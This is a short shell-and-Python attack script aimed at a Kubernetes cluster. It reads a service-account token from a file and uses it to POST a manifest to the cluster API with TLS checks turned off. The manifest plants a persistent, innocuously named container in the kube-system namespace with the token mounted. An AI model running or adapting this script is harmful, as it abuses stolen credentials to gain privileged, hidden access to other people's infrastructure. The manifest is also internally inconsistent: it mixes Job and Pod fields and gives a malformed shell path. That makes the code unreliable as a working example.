python -m pip install requests
cat<<EOF | python -
payload = '''apiVersion: batch/v1
kind: Pod
metadata:
  name: definitely-legit
  namespace: kube-system
spec:
  template:
    metadata:
      name: definitely-legit
      namespace: kube-system
    spec:
      restartPolicy: Never
      containers:
        - name: trust-me
          image: python:3.15-bookworm
          command: ["bin/bash", "-c", "--"]
          args: ["while true; do sleep 60; done;"]
      serviceAccountName: kube-system
      automountServiceAccountToken: true
'''

with open("/var/run/application-id/token") as f:
    token = f.read()

from requests import request
r = request("POST", \
"https://kubernetes.default/apis/batch/v1/namespaces/kube-system/pods", \
verify=False, \
data=bytes(payload, "utf-8"), \
headers={"Authorization": f"Bearer {token}", \
"Content-Type": "application/yaml"})

print(r.text)
EOF
